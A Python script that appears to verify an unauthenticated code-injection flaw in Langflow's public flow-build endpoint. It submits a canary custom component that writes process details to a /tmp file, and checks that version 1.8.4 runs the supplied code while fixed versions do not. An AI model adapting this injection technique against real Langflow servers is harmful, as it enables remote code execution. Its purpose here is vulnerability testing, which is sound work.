from pathlib import Path
import importlib.util
import json
import os
import sys

root = Path(__file__).parent
action, tag = sys.argv[1:]
assert action in ['verify', 'health', 'registry', 'cleanup']
version = os.environ['LANGFLOW_PUBLIC_VERSION']
os.environ['LANGFLOW_PROFILE'] = 'auth'
spec = importlib.util.spec_from_file_location('native', root.parent/'langflow/native.py')
module = importlib.util.module_from_spec(spec)
spec.loader.exec_module(module)
native = module.Native(tag)
state_path = native.artifacts/'langflow-public-native-state.json'
if action in ['registry', 'cleanup']:
    state = json.loads(state_path.read_text())
    if action == 'registry':
        assert native.flows(state['token']) == state['registry']
        print(json.dumps(dict(flow_ids=sorted(row['id'] for row in state['registry']))))
    else:
        for row in reversed(state['created']):
            assert native.http('/api/v1/flows/'+row['id'],state['token'],method='DELETE')[0] == 200
        assert native.flows(state['token']) == state['baseline']
        print(json.dumps(dict(restored=True,flow_ids=sorted(row['id'] for row in state['baseline']))))
    sys.exit(0)
status, body = native.http('/api/v1/version')
assert status == 200 and json.loads(body)['version'] == version
version_document = json.loads(body)
if action == 'health':
    print(json.dumps(version_document))
    sys.exit(0)
expected = json.loads((root/'vendor.json').read_text())['installed'][version]
program = """import hashlib,importlib.metadata as m,importlib.util as u,json,os,pathlib,sys
out=dict(uid=os.getuid(),gid=os.getgid(),python=sys.version.split()[0],versions={n:m.version(n) for n in ['langflow','langflow-base','lfx','mcp']},sources={})
for name in json.loads(sys.argv[1]):
 package,relative=name.split('/',1);root=pathlib.Path(next(iter(u.find_spec(package).submodule_search_locations)));out['sources'][name]=hashlib.sha256((root/relative).read_bytes()).hexdigest()
print(json.dumps(out))"""
vendor = json.loads(native.execute('python','-c',program,json.dumps(list(expected['sources']))))
assert vendor == expected
assert native.http('/api/v1/auto_login')[0] == 403
assert native.http('/api/v1/flows/')[0] == 403
assert native.http('/api/v1/flows/', 'module-target-invalid')[0] == 401
token = native.token()
state = json.loads(state_path.read_text()) if state_path.exists() else None
baseline = state['baseline'] if state else native.flows(token)
created = state['created'] if state else []
proofs = []
backend = None
stored_path = '/tmp/module-target-langflow-public-stored'
injected_path = '/tmp/module-target-langflow-public-injected'


def component(marker, path=None):
    effects = [] if path is None else [
        '        import builtins, json, os',
        '        from langflow.services.deps import get_settings_service',
        '        settings = get_settings_service()',
        "        state = dict(marker=" + repr(marker) + ", pid=os.getpid(), uid=os.getuid(), gid=os.getgid(), builtin_keys=sorted(vars(builtins)), auto_login=settings.auth_settings.AUTO_LOGIN, lazy_load_components=settings.settings.lazy_load_components, allow_custom_components=getattr(settings.settings,'allow_custom_components',None))",
        "        with open(" + repr(path) + ", 'a') as output:",
        "            output.write(json.dumps(state)+'\\n')",
    ]
    code = '\n'.join([
        'from lfx.custom import Component',
        'from lfx.io import Output',
        'from lfx.schema.data import Data',
        'class ModuleTargetPublicCanary(Component):',
        "    display_name = 'Module public canary'",
        "    name = 'ModuleTargetPublicCanary'",
        "    outputs = [Output(display_name='Native output', name='out', method='native_output')]",
        '    def native_output(self) -> Data:',
    ] + effects + ["        return Data(data={'output': " + repr(marker) + '})']) + '\n'
    status, body = native.http('/api/v1/custom_component', token, data=dict(code=code, frontend_node={}))
    assert status == 200, (status, body)
    result = json.loads(body)
    assert result['type'] == 'ModuleTargetPublicCanary', result
    node_id = 'ModuleTargetPublicCanary-native'
    return dict(nodes=[dict(id=node_id, type='genericNode', position=dict(x=0,y=0), data=dict(id=node_id, type=result['type'], node=result['data']))], edges=[])


def absent(path):
    native.execute('test', '!', '-e', path)


def proof(path, marker):
    global backend
    data = json.loads(native.execute('python', '-c', 'import pathlib,json;p=pathlib.Path(' + repr(path) + ');lines=p.read_text().splitlines();assert len(lines)==1,lines;print(lines[0]);assert p.stat().st_uid==1000;p.unlink();assert not p.exists()'))
    assert data['marker'] == marker and data['uid'] == 1000 and data['gid'] == 0
    assert data['auto_login'] is False and data['lazy_load_components'] is False
    assert data['allow_custom_components'] == (True if version == '1.9.0' else None)
    state = {key:value for key,value in data.items() if key != 'marker'}
    assert backend is None or backend == state
    backend = state
    return data


def build(flow_id, data, *, authenticated=False, cookie=True):
    prefix = '/api/v1/build/' if authenticated else '/api/v1/build_public_tmp/'
    headers = {'Cookie': 'client_id=module-target-native-public'} if cookie else {}
    status, body = native.http(prefix+flow_id+'/flow', token if authenticated else None, data={'data':data,'inputs':None}, headers=headers, timeout=30)
    if status != 200:
        return status, json.loads(body)
    job_id = json.loads(body)['job_id']
    status, body = native.http(prefix+job_id+'/events', token if authenticated else None, timeout=60)
    assert status == 200, (status,body)
    events = [json.loads(line) for line in body.splitlines() if line.strip()]
    assert events and events[-1]['event'] == 'end', events
    vertices = [row['data']['build_data'] for row in events if row['event']=='end_vertex']
    assert len(vertices)==1 and vertices[0]['valid'] is True, events
    return 200, dict(job_id=job_id,events=events,vertex=vertices[0])


absent(stored_path)
absent(injected_path)
stored = component('native-stored-definition')
injected = component('native-supplied-definition', injected_path)
absent(stored_path)
absent(injected_path)
if state is None:
    assert tag == 'before'
    for access in ['PUBLIC','PRIVATE']:
        status, body = native.http('/api/v1/flows/', token, data=dict(name='Module native '+access,description='Public build boundary control',mcp_enabled=False,access_type=access,data=stored))
        assert status==201,(status,body)
        row=json.loads(body);assert row['access_type']==access
        created.append(row)
    state = dict(baseline=baseline,created=created,token=token,registry=native.flows(token))
    state_path.write_text(json.dumps(state,indent=2)+'\n')
else:
    assert native.flows(token)==state['registry']
for name,flow_id,cookie,expected_status in [
    ('missing-cookie',created[0]['id'],False,400),
    ('private-flow',created[1]['id'],True,403),
    ('unknown-flow','00000000-0000-4000-8000-000000000001',True,403),
    ('malformed-flow','not-a-uuid',True,422),
]:
    status,value=build(flow_id,injected,cookie=cookie)
    assert status==expected_status,(name,status,value)
    absent(stored_path);absent(injected_path)
    proofs.append(dict(case=name,status=status,response=value))
for repeat in range(2):
    status,value=build(created[0]['id'],injected)
    assert status==200
    vulnerable=version=='1.8.4'
    if vulnerable:
        proof(injected_path,'native-supplied-definition')
    else:
        absent(injected_path)
    absent(stored_path)
    expected_output='native-supplied-definition' if vulnerable else 'native-stored-definition'
    assert value['vertex']['data']['outputs']['out']['message']=={'output':expected_output},value
    proofs.append(dict(case='public-supplied-data',repeat=repeat,status=status,output=expected_output))
status,value=build(created[1]['id'],injected,authenticated=True)
assert status==200
proof(injected_path,'native-supplied-definition');absent(stored_path)
assert value['vertex']['data']['outputs']['out']['message']=={'output':'native-supplied-definition'},value
proofs.append(dict(case='authenticated-control',status=status,output='native-supplied-definition'))
assert native.flows(token)==state['registry']
print(json.dumps(dict(version=version_document,vendor=vendor,proofs=proofs,backend=backend,flow_ids=sorted(row['id'] for row in state['registry']),public_id=created[0]['id'],private_id=created[1]['id'],full_registry_unchanged=True,baseline_flow_ids=sorted(row['id'] for row in baseline))))
